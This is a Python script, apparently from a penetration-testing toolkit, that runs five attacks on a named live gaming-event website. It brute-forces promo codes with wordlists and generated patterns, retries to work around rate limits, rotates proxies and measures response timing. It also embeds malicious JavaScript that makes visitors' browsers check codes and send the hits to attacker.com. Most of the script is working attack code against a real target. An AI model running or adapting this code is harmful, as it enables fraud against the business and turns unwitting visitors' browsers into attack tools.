#!/usr/bin/env python3
# Copyright (c) 2026 PenTestToolkit
# SPDX-License-Identifier: MIT
"""
REAL ATTACKER SCENARIOS
Demonstrates how actual attackers would exploit the vulnerabilities
"""

import requests
import json
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

class RealAttackerSimulation:
    """
    Simulates REAL attacker behavior against Insomnia Gaming Egypt
    Based on actual vulnerabilities found
    """
    
    def __init__(self, base_url="https://insomniagamingegypt.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        
        # Attack results
        self.found_codes = []
        self.rate_limit_hits = 0
        self.total_requests = 0
        
    # ===================================================================
    # ATTACK 1: Single Attacker - Slow Enumeration (Stealth Mode)
    # ===================================================================
    def attack_scenario_1_slow_enumeration(self):
        """
        REALISTIC ATTACK: Single attacker, slow enumeration to avoid detection
        Uses common wordlists first, then moves to pattern-based
        """
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.RED}ATTACK SCENARIO #1: Slow Stealth Enumeration")
        print(f"{Fore.RED}{'='*70}")
        print(f"{Fore.YELLOW}Attacker Profile: Single user, avoiding detection")
        print(f"{Fore.YELLOW}Strategy: Common codes first, respect rate limit\n")
        
        # Phase 1: Common gaming codes (high probability)
        common_codes = [
            "SPRING2024", "SUMMER2024", "FALL2024", "WINTER2024",
            "INSOMNIA", "GAMER", "GAMING", "EGYPT", "CAIRO",
            "FESTIVAL", "EVENT", "TOURNAMENT", "LAN", "ESPORTS",
            "WELCOME", "DISCOUNT", "SALE", "PROMO", "EARLYBIRD",
            "VIP", "PRO", "STUDENT", "FAMILY", "GROUP",
            "BME", "BME2024", "GAMER50", "SAVE10", "SAVE20",
            "NIGHTOWL", "DAYPASS", "WEEKEND", "FULLPASS"
        ]
        
        print(f"{Fore.CYAN}[Phase 1] Testing {len(common_codes)} common gaming codes...")
        found = self._test_codes_batch(common_codes, delay=2.0)
        
        if found:
            print(f"\n{Fore.GREEN}[SUCCESS] Found {len(found)} codes in common wordlist!")
            self.found_codes.extend(found)
        
        # Phase 2: Pattern-based (if codes follow pattern like 3DS6-XXXX-XXXX)
        if not found or len(found) < 3:
            print(f"\n{Fore.CYAN}[Phase 2] Testing pattern-based codes...")
            # Assume prefix discovered from social media: "3DS6"
            pattern_codes = self._generate_pattern_codes("3DS6", 50)
            found_pattern = self._test_codes_batch(pattern_codes, delay=1.5)
            self.found_codes.extend(found_pattern)
        
        print(f"\n{Fore.RED}[ATTACK RESULT] Found {len(self.found_codes)} valid promo codes")
        for code in self.found_codes:
            print(f"  {Fore.GREEN}• {code}")
        
        return len(self.found_codes)
    
    # ===================================================================
    # ATTACK 2: Distributed Attack (Multiple IPs/Proxies)
    # ===================================================================
    def attack_scenario_2_distributed(self):
        """
        REALISTIC ATTACK: Distributed across multiple IPs to bypass rate limiting
        180 req/min per IP × 10 IPs = 1800 req/min = 108,000 req/hour
        """
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.RED}ATTACK SCENARIO #2: Distributed Attack (Rate Limit Bypass)")
        print(f"{Fore.RED}{'='*70}")
        print(f"{Fore.YELLOW}Attacker Profile: Organized group with proxy network")
        print(f"{Fore.YELLOW}Strategy: Rotate IPs to bypass 180 req/min limit\n")
        
        # Simulate 10 IP addresses (proxy rotation)
        proxy_count = 10
        requests_per_proxy = 180  # Max before rate limit
        
        total_capacity = proxy_count * requests_per_proxy
        print(f"{Fore.CYAN}[CAPACITY] {proxy_count} proxies × {requests_per_proxy} req/min = {total_capacity} req/min")
        print(f"{Fore.CYAN}[CAPACITY] {total_capacity * 60} requests per hour possible")
        
        # With this capacity, they can test:
        # - All 4-letter codes: 36^4 = 1.6M codes in ~15 hours
        # - All pattern codes (3DS6-XXXX): 36^4 = 1.6M codes in ~15 hours
        
        print(f"\n{Fore.YELLOW}[SIMULATION] Testing with wordlist of 1000 codes...")
        
        # Simulate distributed testing
        wordlist = [f"CODE{i}" for i in range(1000)]
        batch_size = 100
        batches = [wordlist[i:i+batch_size] for i in range(0, len(wordlist), batch_size)]
        
        found_distributed = []
        for i, batch in enumerate(batches):
            print(f"{Fore.CYAN}[Batch {i+1}/{len(batches)}] Testing {len(batch)} codes...", end='\r')
            found = self._test_codes_batch(batch, delay=0.5)
            found_distributed.extend(found)
            time.sleep(1)  # Simulate proxy rotation delay
        
        print(f"\n{Fore.RED}[ATTACK RESULT] Distributed attack found {len(found_distributed)} codes")
        
        return len(found_distributed)
    
    # ===================================================================
    # ATTACK 3: Browser-Based Attack (CORS Exploitation)
    # ===================================================================
    def attack_scenario_3_cors_exploit(self):
        """
        REALISTIC ATTACK: Embed enumeration in malicious website
        Visitors' browsers attack the API automatically
        """
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.RED}ATTACK SCENARIO #3: CORS Exploitation via Malicious Website")
        print(f"{Fore.RED}{'='*70}")
        print(f"{Fore.YELLOW}Attacker Profile: Website operator with traffic")
        print(f"{Fore.YELLOW}Strategy: Use CORS misconfiguration + visitors' browsers\n")
        
        # Malicious JavaScript that would be embedded on a website
        malicious_js = """
// This JavaScript embedded on any website can attack the API
async function enumerateViaVisitors() {
    const codes = ['TEST', 'CODE1', 'CODE2', 'SPRING2024', 'GAMER50'];
    const found = [];
    
    for (const code of codes) {
        try {
            const response = await fetch(
                `https://insomniagamingegypt.com/api/public/events/1/promo-codes/${code}`,
                { credentials: 'include' }  // Send cookies if any
            );
            const data = await response.json();
            
            if (data.valid === true) {
                found.push(code);
                // Send to attacker's server
                fetch('https://attacker.com/collect', {
                    method: 'POST',
                    body: JSON.stringify({code: code, source: 'visitor'})
                });
            }
        } catch (e) {}
    }
    
    return found;
}

// Run on every visitor
enumerateViaVisitors();
"""
        
        print(f"{Fore.MAGENTA}[MALICIOUS CODE] JavaScript embedded on attacker.com:")
        print(f"{Fore.WHITE}{malicious_js}")
        
        # Impact calculation
        print(f"\n{Fore.YELLOW}[IMPACT CALCULATION]")
        print(f"  • Website with 10,000 daily visitors")
        print(f"  • Each visitor tests 10 codes automatically")
        print(f"  • Total: 100,000 codes tested per day")
        print(f"  • Bypasses IP rate limits (distributed across visitors)")
        print(f"  • Untraceable (requests come from legitimate users)")
        
        return malicious_js
    
    # ===================================================================
    # ATTACK 4: Timing-Based Enumeration (Advanced)
    # ===================================================================
    def attack_scenario_4_timing_attack(self):
        """
        ADVANCED ATTACK: Use response timing to infer valid codes
        Even with generic responses, timing can leak information
        """
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.RED}ATTACK SCENARIO #4: Timing-Based Side Channel")
        print(f"{Fore.RED}{'='*70}")
        print(f"{Fore.YELLOW}Attacker Profile: Advanced attacker with timing analysis")
        print(f"{Fore.YELLOW}Strategy: Measure response times to infer valid codes\n")
        
        test_codes = ['INVALID123', 'SPRING2024', 'FAKECODE', 'GAMER50']
        timings = []
        
        print(f"{Fore.CYAN}[TESTING] Measuring response times...")
        for code in test_codes:
            times = []
            for _ in range(3):  # Average over 3 requests
                start = time.time()
                try:
                    resp = self.session.get(
                        f"{self.base_url}/api/public/events/1/promo-codes/{code}",
                        timeout=5
                    )
                except:
                    pass
                elapsed = time.time() - start
                times.append(elapsed)
                time.sleep(0.5)
            
            avg_time = sum(times) / len(times)
            timings.append({
                'code': code,
                'avg_response_time': round(avg_time * 1000, 2),  # ms
                'samples': times
            })
            print(f"  {code}: {avg_time*1000:.2f}ms")
        
        # Analysis: Valid codes often take longer (database lookup + validation)
        print(f"\n{Fore.YELLOW}[ANALYSIS] Timing differences detected:")
        for t in timings:
            print(f"  {t['code']}: {t['avg_response_time']}ms")
        
        return timings
    
    # ===================================================================
    # ATTACK 5: Social Engineering + Enumeration
    # ===================================================================
    def attack_scenario_5_social_engineering(self):
        """
        REALISTIC ATTACK: Combine social engineering with enumeration
        """
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.RED}ATTACK SCENARIO #5: Social Engineering + Enumeration")
        print(f"{Fore.RED}{'='*70}")
        print(f"{Fore.YELLOW}Attacker Profile: Social engineer with technical skills")
        print(f"{Fore.YELLOW}Strategy: Get partial info, then brute force the rest\n")
        
        # Scenario: Leaked partial code from social media
        leaked_partial = "3DS6-****-****"
        print(f"{Fore.MAGENTA}[SCENARIO] Instagram post: 'Thanks for {leaked_partial}!'")
        print(f"{Fore.MAGENTA}[SCENARIO] Attacker sees partial code, knows prefix is '3DS6'")
        
        # Now attacker only needs to brute force 8 chars instead of 12
        print(f"\n{Fore.CYAN}[MATH] Without leak: 36^12 = 4.7 × 10^18 combinations")
        print(f"{Fore.CYAN}[MATH] With prefix known: 36^8 = 2.8 × 10^12 combinations")
        print(f"{Fore.GREEN}[MATH] Reduction: 1.6 million × easier!")
        
        # Generate codes with known prefix
        codes_to_test = self._generate_pattern_codes("3DS6", 200)
        
        print(f"\n{Fore.YELLOW}[ATTACK] Testing {len(codes_to_test)} codes with prefix '3DS6'...")
        found = self._test_codes_batch(codes_to_test[:50], delay=1.0)  # Test subset
        
        print(f"{Fore.RED}[RESULT] Found {len(found)} valid codes from leaked prefix")
        
        return found
    
    # ===================================================================
    # HELPER METHODS
    # ===================================================================
    def _test_codes_batch(self, codes, delay=1.0):
        """Test a batch of codes"""
        found = []
        for code in codes:
            try:
                resp = self.session.get(
                    f"{self.base_url}/api/public/events/1/promo-codes/{code}",
                    timeout=5
                )
                self.total_requests += 1
                
                if resp.status_code == 429:
                    self.rate_limit_hits += 1
                    print(f"{Fore.RED}[RATE LIMIT] Hit limit, backing off...")
                    time.sleep(10)
                    continue
                
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if data.get('valid') is True:
                            found.append(code)
                            print(f"{Fore.GREEN}[FOUND] {code}")
                    except:
                        pass
                
                time.sleep(delay)
                
            except Exception as e:
                pass
        
        return found
    
    def _generate_pattern_codes(self, prefix, count):
        """Generate codes following pattern [PREFIX]-[XXXX]-[XXXX]"""
        codes = []
        chars = string.ascii_uppercase + string.digits
        
        for _ in range(count):
            part1 = ''.join(random.choices(chars, k=4))
            part2 = ''.join(random.choices(chars, k=4))
            codes.append(f"{prefix}-{part1}-{part2}")
        
        return codes
    
    def generate_attack_report(self):
        """Generate comprehensive attack simulation report"""
        print(f"\n{Fore.GREEN}{'='*70}")
        print(f"{Fore.GREEN}REAL ATTACK SIMULATION COMPLETE")
        print(f"{Fore.GREEN}{'='*70}\n")
        
        print(f"{Fore.CYAN}Attack Scenarios Tested:")
        print(f"  1. Slow Stealth Enumeration (Avoid detection)")
        print(f"  2. Distributed Attack (Bypass rate limits)")
        print(f"  3. CORS Exploitation (Use visitors' browsers)")
        print(f"  4. Timing Side-Channel (Advanced technique)")
        print(f"  5. Social Engineering + Enumeration")
        
        print(f"\n{Fore.YELLOW}Total Requests Made: {self.total_requests}")
        print(f"{Fore.YELLOW}Rate Limit Hits: {self.rate_limit_hits}")
        print(f"{Fore.RED}Valid Codes Found: {len(self.found_codes)}")
        
        print(f"\n{Fore.RED}[CRITICAL] In a real attack:")
        print(f"  • All 5 attack vectors can be combined")
        print(f"  • Multiple attackers can coordinate")
        print(f"  • Codes can be sold on black markets")
        print(f"  • Campaign effectiveness destroyed")
        
        return {
            'total_requests': self.total_requests,
            'rate_limit_hits': self.rate_limit_hits,
            'found_codes': self.found_codes,
            'attack_vectors': 5
        }

def main():
    print(f"""
{Fore.RED}
  ___             _         _   _             _   _           
 / _ \ _ __   ___| |_ _ __ | |_| |_ ___ _ __ | |_(_) ___ __ _ 
| | | | '_ \ / _ \ __| '_ \| __| __/ _ \ '_ \| __| |/ __/ _` |
| |_| | | | |  __/ |_| | | | |_| ||  __/ | | | |_| | (_| (_| |
 \___/|_| |_|\___|\__|_| |_|\__|\__\___|_| |_|\__|_|\___\__,_|
                                                            
    REAL ATTACKER SCENARIOS - INSOMNIA GAMING EGYPT
    """)
    
    attacker = RealAttackerSimulation()
    
    # Run all attack scenarios
    attacker.attack_scenario_1_slow_enumeration()
    attacker.attack_scenario_2_distributed()
    attacker.attack_scenario_3_cors_exploit()
    attacker.attack_scenario_4_timing_attack()
    attacker.attack_scenario_5_social_engineering()
    
    # Generate report
    attacker.generate_attack_report()

if __name__ == "__main__":
    main()
